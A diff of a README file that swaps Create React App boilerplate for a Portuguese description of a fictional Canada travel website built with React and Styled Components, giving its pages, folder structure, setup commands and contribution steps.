@@ -1,70 +1,101 @@
-# Getting Started with Create React App
+# Travel Website - React Project
 
-This project was bootstrapped with [Create React App](https://github.com/facebook/create-react-app).
+## Descrição
+Este projeto é um site fictício de viagens para promover o turismo no Canadá. Ele foi desenvolvido utilizando **React** e **Styled Components**, focando na usabilidade, boas práticas de design e experiência do usuário. O design segue uma abordagem moderna com responsividade e organização visual.
 
-## Available Scripts
+## Funcionalidades
+1. **Home Page**:
+   - Destaque para uma imagem principal.
+   - Opção para explorar pacotes de viagens.
 
-In the project directory, you can run:
+2. **Página Sobre (About)**:
+   - Informações sobre a agência de viagens.
+   - Missão e valores.
 
-### `yarn start`
+3. **Guia de Viagem (Travel Guide)**:
+   - Dicas e orientações para os viajantes.
+   - Lista de informações útis, como destinos, temporadas e segurança.
 
-Runs the app in the development mode.\
-Open [http://localhost:3000](http://localhost:3000) to view it in your browser.
+4. **Top Cities**:
+   - Galeria com as cidades mais populares do Canadá.
+   - Detalhes sobre cada destino.
 
-The page will reload when you make changes.\
-You may also see any lint errors in the console.
+5. **Ajuda (Help)**:
+   - Seção de perguntas frequentes (FAQs).
+   - Suporte para reservas e pagamentos.
 
-### `yarn test`
+## Tecnologias Utilizadas
+- **React**: Para criação de componentes reutilizáveis e interatividade.
+- **Styled Components**: Para estilização dinâmica e organização de estilos no projeto.
+- **CSS (Arquivo separado)**: Complementação para estilos globais e responsividade.
 
-Launches the test runner in the interactive watch mode.\
-See the section about [running tests](https://facebook.github.io/create-react-app/docs/running-tests) for more information.
+## Estrutura do Projeto
+```
+travel/
+├── public/
+│   ├── index.html
+│   ├── favicon.ico
+│   └── assets/
+│       └── images/
+├── src/
+│   ├── components/
+│   │   ├── Header.js
+│   │   ├── Footer.js
+│   │   └── Navigation.js
+│   ├── pages/
+│   │   ├── Home.js
+│   │   ├── About.js
+│   │   ├── TravelGuide.js
+│   │   ├── TopCities.js
+│   │   └── Help.js
+│   ├── App.js
+│   ├── GlobalStyles.css
+│   └── index.js
+├── package.json
+└── README.md
+```
 
-### `yarn build`
+## Como Executar o Projeto
+1. [Baixar projeto](https://raw.githubusercontent.com/Germano-Silva/Start_Capgemini/main/Start%20By%20Capgemini/03_Trilha_Java/02_CSS3/02%20-%20CSS%20avan%C3%A7ado/Aula_06/travel/projeto.zip)
 
-Builds the app for production to the `build` folder.\
-It correctly bundles React in production mode and optimizes the build for the best performance.
+2. Navegue até o diretório do projeto:
+   ```bash
+   cd travel
+   ```
 
-The build is minified and the filenames include the hashes.\
-Your app is ready to be deployed!
+3. Instale as dependências:
+   ```bash
+   npm install
+   ```
 
-See the section about [deployment](https://facebook.github.io/create-react-app/docs/deployment) for more information.
+4. Execute o servidor de desenvolvimento:
+   ```bash
+   npm start
+   ```
 
-### `yarn eject`
+5. Abra o navegador e acesse:
+   ```
+   http://localhost:3000
+   ```
 
-**Note: this is a one-way operation. Once you `eject`, you can't go back!**
+## Melhorias Futuras
+- Adicionar um sistema de autenticação para os usuários.
+- Implementar um sistema de carrinho para reservas.
+- Melhorar a responsividade em dispositivos móveis.
+- Adicionar uma API para buscar dados de destinos dinâmicos.
 
-If you aren't satisfied with the build tool and configuration choices, you can `eject` at any time. This command will remove the single build dependency from your project.
+## Contribuições
+Sinta-se à vontade para contribuir com melhorias, relatórios de bugs ou novas ideias. Para isso:
+1. Faça um fork do repositório.
+2. Crie uma branch para sua feature ou correção de bug:
+   ```bash
+   git checkout -b minha-feature
+   ```
+3. Envie um pull request após concluir as alterações.
 
-Instead, it will copy all the configuration files and the transitive dependencies (webpack, Babel, ESLint, etc) right into your project so you have full control over them. All of the commands except `eject` will still work, but they will point to the copied scripts so you can tweak them. At this point you're on your own.
+## Licença
+Este projeto está sob a licença MIT. Consulte o arquivo `LICENSE` para mais detalhes.
 
-You don't have to ever use `eject`. The curated feature set is suitable for small and middle deployments, and you shouldn't feel obligated to use this feature. However we understand that this tool wouldn't be useful if you couldn't customize it when you are ready for it.
+---
+**Autor**: Germano-Silva
 
-## Learn More
-
-You can learn more in the [Create React App documentation](https://facebook.github.io/create-react-app/docs/getting-started).
-
-To learn React, check out the [React documentation](https://reactjs.org/).
-
-### Code Splitting
-
-This section has moved here: [https://facebook.github.io/create-react-app/docs/code-splitting](https://facebook.github.io/create-react-app/docs/code-splitting)
-
-### Analyzing the Bundle Size
-
-This section has moved here: [https://facebook.github.io/create-react-app/docs/analyzing-the-bundle-size](https://facebook.github.io/create-react-app/docs/analyzing-the-bundle-size)
-
-### Making a Progressive Web App
-
-This section has moved here: [https://facebook.github.io/create-react-app/docs/making-a-progressive-web-app](https://facebook.github.io/create-react-app/docs/making-a-progressive-web-app)
-
-### Advanced Configuration
-
-This section has moved here: [https://facebook.github.io/create-react-app/docs/advanced-configuration](https://facebook.github.io/create-react-app/docs/advanced-configuration)
-
-### Deployment
-
-This section has moved here: [https://facebook.github.io/create-react-app/docs/deployment](https://facebook.github.io/create-react-app/docs/deployment)
-
-### `yarn build` fails to minify
-
-This section has moved here: [https://facebook.github.io/create-react-app/docs/troubleshooting#npm-run-build-fails-to-minify](https://facebook.github.io/create-react-app/docs/troubleshooting#npm-run-build-fails-to-minify)
